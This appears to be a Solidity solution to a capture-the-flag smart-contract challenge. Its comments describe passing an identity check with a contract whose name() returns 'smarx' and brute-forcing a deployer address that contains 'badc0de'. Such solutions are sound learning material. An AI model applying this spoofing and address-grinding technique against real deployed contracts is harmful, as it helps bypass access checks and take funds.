pragma solidity ^0.4.21;

//1. require(isSmarx(msg.sender)) will pass by calling the contract from Attack contract
//2. require(isBadCode(msg.sender)); to pass this, we need to pass a wallet that contains 
//      the hex code "badc0de" 
//      this can be done by brute force by creating wallets and creating contracts with those wallets
//      until the bytes20(keccak256(addressUser, nonce)) can be equal to "badc0de"

interface IName {
    function name() external view returns (bytes32);
}

contract Attack is IName{

    function name() external view returns (bytes32){
        return bytes32("smarx");
    }
}